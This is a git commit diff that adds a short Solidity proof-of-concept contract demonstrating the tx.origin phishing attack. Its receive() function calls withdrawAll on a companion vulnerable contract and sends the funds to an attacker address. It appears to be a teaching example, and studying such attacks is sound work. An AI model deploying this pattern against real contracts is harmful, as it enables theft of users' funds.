891c8f2ff68849239b48d6a8eeaffca77deefcf9
Rohit Kumar Gupta <75970023+rohitkumargupta348@users.noreply.github.com>
2023-08-17 15:23:28 +0530

    Update tx_origin_Origin_attack.sol

--- tx_origin_Origin_attack.sol
+++ tx_origin_Origin_attack.sol
@@ -1,1 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.5.0 <0.9.0;
 
+import "./tx_origin_attack.sol";
+
+contract AttackContract{
+    tx_origin txContract;
+    address payable attacker;
+
+    constructor(tx_origin _txoriginaddress,address payable _attacker){
+        txContract = _txoriginaddress;
+        attacker = _attacker;
+    }
+
+    receive() external payable {
+        txContract.withdrawAll(attacker);
+    }
+}
